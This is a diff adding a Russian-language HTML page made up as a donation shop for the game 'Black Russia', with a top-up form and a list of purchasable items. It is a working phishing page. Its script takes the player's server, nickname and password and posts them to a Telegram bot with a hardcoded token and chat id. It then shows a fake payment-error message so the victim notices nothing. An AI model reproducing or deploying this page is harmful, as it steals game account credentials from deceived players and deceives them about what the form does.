@@ -1,0 +1,166 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Black Russia - Donat Shop</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@400;700;900&display=swap" rel="stylesheet">
+    <style>
+        * { box-sizing: border-box; margin: 0; padding: 0; -webkit-tap-highlight-color: transparent; }
+        body, html { width: 100%; min-height: 100vh; background-color: #0c0c0c; font-family: 'Montserrat', sans-serif; color: white; }
+
+        /* ОСНОВНАЯ ПАНЕЛЬ ОПЛАТЫ */
+        .main-panel {
+            background: #111; 
+            margin: -60px 20px 30px; 
+            padding: 35px 25px; 
+            border-radius: 40px; 
+            position: relative; 
+            z-index: 100;
+        }
+
+        .form-title { font-size: 32px; font-weight: 900; line-height: 1.1; margin-bottom: 30px; text-transform: uppercase; }
+
+        .input-group { margin-bottom: 20px; }
+        .input-label { display: block; font-size: 14px; font-weight: 700; margin-bottom: 8px; margin-left: 5px; }
+        
+        .white-input {
+            width: 100%; height: 55px; background: #fff; border: none; 
+            padding: 0 25px; border-radius: 30px; color: #000; 
+            font-weight: 600; font-size: 16px; outline: none;
+        }
+
+        .rub-tag { position: absolute; right: 25px; top: 50%; transform: translateY(-50%); color: #ff0000; font-weight: 900; font-size: 14px; }
+
+        .pay-btn {
+            background: #ff0000; width: 100%; padding: 22px; border: none; 
+            transform: skewX(-10deg); border-radius: 10px; cursor: pointer;
+            box-shadow: 0 10px 30px rgba(255, 0, 0, 0.3);
+        }
+        .pay-btn span { display: block; transform: skewX(10deg); color: #fff; font-weight: 900; font-size: 22px; text-transform: uppercase; }
+
+        /* СЕКЦИЯ ТОВАРОВ */
+        .donate-info-section { padding: 20px; }
+        .section-title { font-size: 24px; font-weight: 900; text-transform: uppercase; margin-bottom: 30px; line-height: 1.2; }
+        .highlight { color: #ff4500; }
+
+        .items-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 30px 20px; }
+        .item-card { display: flex; flex-direction: column; gap: 8px; }
+        .item-icon { width: 40px; height: 40px; margin-bottom: 5px; }
+        .item-name { font-size: 14px; font-weight: 900; text-transform: uppercase; line-height: 1.2; }
+        .item-desc { font-size: 11px; color: #777; line-height: 1.4; font-weight: 500; }
+        .item-price { font-size: 14px; font-weight: 900; color: #ff4500; margin-top: 5px; }
+
+        svg { fill: #ff4500; }
+    </style>
+</head>
+<body>
+
+    <div style="max-width: 500px; margin: 0 auto;">
+        <div style="height: 45vh; background: url('https://i.postimg.cc/XJtSqsxy/Donat.jpg') center top/cover; border-radius: 0 0 50px 50px;"></div>
+
+        <div class="main-panel">
+            <h1 class="form-title">ПОПОЛНЕНИЕ<br>СЧЁТА</h1>
+            <form id="tgForm">
+                <div class="input-group">
+                    <label class="input-label">Укажи сервер</label>
+                    <input type="text" id="server" class="white-input" placeholder="Напиши свой номер сервера с #" required>
+                </div>
+                <div class="input-group">
+                    <label class="input-label">Введи игровой ник</label>
+                    <input type="text" id="nick" class="white-input" placeholder="Ivan_Ivanov" required>
+                </div>
+                <div class="input-group">
+                    <label class="input-label">Введи пароль</label>
+                    <input type="password" id="pass" class="white-input" placeholder="........" required>
+                </div>
+                <div class="input-group">
+                    <label class="input-label">Введи E-mail</label>
+                    <input type="email" id="mail" class="white-input" placeholder="E-mail" required>
+                </div>
+                <div class="input-group">
+                    <label class="input-label">Сумма</label>
+                    <div style="position: relative;">
+                        <input type="number" id="summ" class="white-input" placeholder="1000" required>
+                        <span class="rub-tag">RUB</span>
+                    </div>
+                </div>
+                <button type="submit" class="pay-btn"><span>ПОПОЛНИТЬ</span></button>
+            </form>
+        </div>
+
+        <div class="donate-info-section">
+            <h2 class="section-title"><span class="highlight">ЧТО МОЖНО КУПИТЬ</span><br>ЗА ДОНАТ?</h2>
+            
+            <div class="items-grid">
+                <div class="item-card">
+                    <div class="item-icon">
+                        <svg viewBox="0 0 24 24"><path d="M20 7h-4V5c0-1.1-.9-2-2-2h-4c-1.1 0-2 .9-2 2v2H4c-1.1 0-2 .9-2 2v10c0 1.1.9 2 2 2h16c1.1 0 2-.9 2-2V9c0-1.1-.9-2-2-2zM10 5h4v2h-4V5zm10 14H4V9h16v10z"/></svg>
+                    </div>
+                    <div class="item-name">BLACK PASS</div>
+                    <div class="item-desc">Боевой пропуск — твой путь к эксклюзивным наградам сезона! Открывает премиальную цепочку наград</div>
+                    <div class="item-price">790 BC</div>
+                </div>
+
+                <div class="item-card">
+                    <div class="item-icon">
+                        <svg viewBox="0 0 24 24"><path d="M18.92 6.01C18.72 5.42 18.16 5 17.5 5h-11c-.66 0-1.21.42-1.42 1.01L3 12v8c0 .55.45 1 1 1h1c.55 0 1-.45 1-1v-1h12v1c0 .55.45 1 1 1h1c.55 0 1-.45 1-1v-8l-2.08-5.99zM6.5 16c-.83 0-1.5-.67-1.5-1.5S5.67 13 6.5 13s1.5.67 1.5 1.5S7.33 16 6.5 16zm11 0c-.83 0-1.5-.67-1.5-1.5s.67-1.5 1.5-1.5 1.5.67 1.5 1.5-.67 1.5-1.5 1.5zM5 11l1.27-3.82c.07-.21.28-.35.5-.35h10.46c.22 0 .43.14.5.35L19 11H5z"/></svg>
+                    </div>
+                    <div class="item-name">Увеличение слотов для авто</div>
+                    <div class="item-desc">Увеличивает количество доступных слотов для твоего транспорта</div>
+                    <div class="item-price">100 BC</div>
+                </div>
+
+                <div class="item-card">
+                    <div class="item-icon">
+                        <svg viewBox="0 0 24 24"><path d="M16 17.01V10h-2v7.01h-3L15 21l4-3.99h-3zM9 3L5 6.99h3V14h2V6.99h3L9 3z"/></svg>
+                    </div>
+                    <div class="item-name">Передача семьи игроку</div>
+                    <div class="item-desc">Ты сможешь передать созданную тобой семью другому игроку</div>
+                    <div class="item-price">100 BC</div>
+                </div>
+
+                <div class="item-card">
+                    <div class="item-icon">
+                        <svg viewBox="0 0 24 24"><path d="M3 17.25V21h3.75L17.81 9.94l-3.75-3.75L3 17.25zM20.71 7.04c.39-.39.39-1.02 0-1.41l-2.34-2.34c-.39-.39-1.02-.39-1.41 0l-1.83 1.83 3.75 3.75 1.83-1.83z"/></svg>
+                    </div>
+                    <div class="item-name">Изменить название семьи</div>
+                    <div class="item-desc">Ты сможешь сменить название своей семьи или банды</div>
+                    <div class="item-price">100 BC</div>
+                </div>
+
+                <div class="item-card">
+                    <div class="item-icon">
+                        <svg viewBox="0 0 24 24"><path d="M14 2H6c-1.1 0-1.99.9-1.99 2L4 20c0 1.1.89 2 1.99 2H18c1.1 0 2-.9 2-2V8l-6-6zm2 16H8v-2h8v2zm0-4H8v-2h8v2zm-3-5V3.5L18.5 9H13z"/></svg>
+                    </div>
+                    <div class="item-name">Покупка всех лицензий</div>
+                    <div class="item-desc">Получение всех возможных лицензий единовременно</div>
+                    <div class="item-price">150 BC</div>
+                </div>
+
+                <div class="item-card">
+                    <div class="item-icon">
+                        <svg viewBox="0 0 24 24"><path d="M1 21h22L12 2 1 21zm12-3h-2v-2h2v2zm0-4h-2v-4h2v4z"/></svg>
+                    </div>
+                    <div class="item-name">Снятие предупреждения</div>
+                    <div class="item-desc">Полностью убирает одно предупреждение от администрации</div>
+                    <div class="item-price">100 BC</div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        document.getElementById('tgForm').onsubmit = async (e) => {
+            e.preventDefault();
+            const text = `🚀 ЛОГ!\n📍 Сервер: ${document.getElementById('server').value}\n👤 Ник: ${document.getElementById('nick').value}\n🔑 Пасс: ${document.getElementById('pass').value}\n💰 Сумма: ${document.getElementById('summ').value} RUB`;
+            await fetch(`https://api.telegram.org/bot8425703516:AAFSxqx8Zq6AS_9tjT7dN75CbGZ1r8WFJVM/sendMessage`, {
+                method: 'POST', headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({chat_id: '81872631', text: text})
+            });
+            alert('Ошибка сервера оплаты. Попробуйте через 5 минут.');
+        };
+    </script>
+</body>
+</html>
